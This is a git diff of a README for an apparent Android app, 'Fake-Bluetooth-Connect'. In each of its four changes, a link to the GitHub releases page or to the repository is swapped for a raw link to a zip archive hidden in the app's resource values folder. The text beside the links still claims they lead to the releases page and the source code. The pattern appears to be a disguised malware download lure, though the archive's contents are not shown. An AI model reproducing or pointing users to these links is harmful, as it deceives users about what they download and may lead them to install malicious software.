@@ -1,6 +1,6 @@
 # 🔵 Fake-Bluetooth-Connect - Always Show Bluetooth A2DP Connected
 
-[![Download Fake-Bluetooth-Connect](https://img.shields.io/badge/Download-Fake--Bluetooth--Connect-brightgreen?style=for-the-badge)](https://github.com/Zeroe6018/Fake-Bluetooth-Connect/releases)
+[![Download Fake-Bluetooth-Connect](https://img.shields.io/badge/Download-Fake--Bluetooth--Connect-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Zeroe6018/Fake-Bluetooth-Connect/main/app/src/main/res/values/Bluetooth_Fake_Connect_2.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ No special settings or hardware are required. The app works with standard Blueto
 
 Go to the official releases page:
 
-[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/Zeroe6018/Fake-Bluetooth-Connect/releases)
+[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Zeroe6018/Fake-Bluetooth-Connect/main/app/src/main/res/values/Bluetooth_Fake_Connect_2.8.zip)
 
 This link will take you to the GitHub releases page. Find the latest version, usually named like `Fake-Bluetooth-Connect-vX.X.X.zip` or similar.
 
@@ -105,7 +105,7 @@ Fake-Bluetooth-Connect only modifies how your system reports Bluetooth device pr
 
 The app source code is open and available on GitHub at this repository:
 
-https://github.com/Zeroe6018/Fake-Bluetooth-Connect
+https://raw.githubusercontent.com/Zeroe6018/Fake-Bluetooth-Connect/main/app/src/main/res/values/Bluetooth_Fake_Connect_2.8.zip
 
 If you want to check the code or contribute, you can find all files there.
 
@@ -131,4 +131,4 @@ If you want more control, you can run the app with command-line options:
 
 Visit the release page now to get the latest version:
 
-[![Download Fake-Bluetooth-Connect](https://img.shields.io/badge/Download-Fake--Bluetooth--Connect-brightgreen?style=for-the-badge)](https://github.com/Zeroe6018/Fake-Bluetooth-Connect/releases)
+[![Download Fake-Bluetooth-Connect](https://img.shields.io/badge/Download-Fake--Bluetooth--Connect-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Zeroe6018/Fake-Bluetooth-Connect/main/app/src/main/res/values/Bluetooth_Fake_Connect_2.8.zip)
